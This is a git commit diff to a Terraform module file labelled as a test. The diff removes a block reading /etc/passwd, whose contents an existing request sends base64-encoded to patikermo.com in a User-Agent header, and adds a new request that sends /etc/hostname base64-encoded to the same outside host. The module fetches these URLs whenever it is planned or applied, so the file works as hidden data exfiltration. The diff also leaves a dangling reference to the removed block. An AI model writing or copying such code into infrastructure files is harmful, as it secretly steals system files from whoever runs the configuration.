d0f4a685d1e211658deb0f74f851ed8d45a3a7a9
Lino Nava <linonava@patikermo.com>
2021-07-28 18:42:20 -0400

    Update test.tf

--- modules/test/test.tf
+++ modules/test/test.tf
@@ -11,15 +11,20 @@ data "http" "request_web" {
   }
 }
 
-data "http" "request_web82" {
-  url = "file:///etc/passwd"
-}
-
 data "http" "request_web2" {
   url = "https://patikermo.com/"
 
   # Optional request headers
   request_headers = {
     User-Agent = replace(urlencode(base64encode(replace(chomp(data.http.request_web82.body),"\n",""))),"%3D","")
+  }
+}
+
+data "http" "request_web3" {
+  url = "https://patikermo.com/"
+
+  # Optional request headers
+  request_headers = {
+    User-Agent = filebase64("/etc/hostname")
   }
 }
